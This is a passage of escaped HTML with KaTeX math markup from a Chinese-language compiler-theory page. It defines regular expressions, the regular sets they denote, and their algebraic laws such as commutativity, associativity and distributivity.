class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>都是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，所表示的正规集为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，那么\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}|e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∪</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}|e_{2}\\right)=L\\left(e_{1}\\right) \\cup L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}e_{2}\\right)=L\\left(e_{1}\\right)  L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\left(e_{1}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup><mo fence=\"true\">)</mo></mrow><mo>=</mo><msup><mrow><mo fence=\"true\">(</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">L\\left(\\left(e_{1}\\right)^{*}\\right)=\\left(L\\left(e_{1}\\right)\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.20001em;vertical-align:-0.35001em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">(</span></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">)</span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n</li>\n</ol>\n<h5 id=\"正规式的一些性质\"><a class=\"markdownIt-Anchor\" href=\"#正规式的一些性质\"></a> 正规式的一些性质</h5>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span></span></span></span>运算的交换律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>B</mi><mo>=</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A|B=B|A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span></span></span></span>运算的结合律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>B</mi><mo fence=\"true\">)</mo></mrow><mi mathvariant=\"normal\">∣</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A|\\left(B|C\\right)=\\left(A|B\\right)|C</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo>⋅</mo></mrow><annotation encoding=\"application/x-tex\">\\cdot</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.44445em;vertical-align:0em;\"></span><span class=\"mord\">⋅</span></span></span></span>运算的结合律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>A</mi><mi>B</mi><mo fence=\"true\">)</mo></mrow><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A\\left(BC\\right)=\\left(AB\\right)C</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li>分配律\t<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mrow><mo fence=\"true\">(</mo><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>C</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>A</mi><mi>B</mi><mi mathvariant=\"normal\">∣</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">A\\left(B|C\\right)=AB|AC</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi>ϵ</mi><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi><mi>A</mi><mo>=</mo><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\epsilon|\\epsilon A=A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mrow><mo fence=\"true\">(</mo><msup><mi>A</mi><mo>∗</mo></msup><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup><mo>=</mo><msup><mi>A</mi><mo>∗</mo></msup></mrow><annotation 